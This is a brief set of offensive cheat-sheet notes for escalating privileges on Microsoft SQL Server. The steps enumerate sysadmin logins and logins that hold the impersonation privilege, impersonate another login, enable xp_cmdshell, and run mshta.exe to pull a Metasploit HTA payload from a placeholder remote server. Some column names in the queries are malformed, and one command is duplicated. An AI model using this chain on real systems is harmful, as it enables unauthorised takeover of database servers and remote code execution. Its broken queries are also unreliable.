## mssql command to retrive sysadmin user
```
select loginname from syslogins where sysadmin = 1;
```

## mssql Command to check users with impersonate privilege
```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal id = b.principal id WHERE a.permission_name = 'IMPERSONATE';
```

## Impersonate
```
exec as login = 'dbuser';
```
- Check currentuser
```
SELECT SYSTEM_USER;
```
```
exec as login = 'dbuser';
```
## Then enable CMD Shell and use mshta.exe exploit method
```
enable_xp_cmdshell;
exec xp_cmdshell "mshta.exe http://remoteserver/metasploitpayload.hta"
```
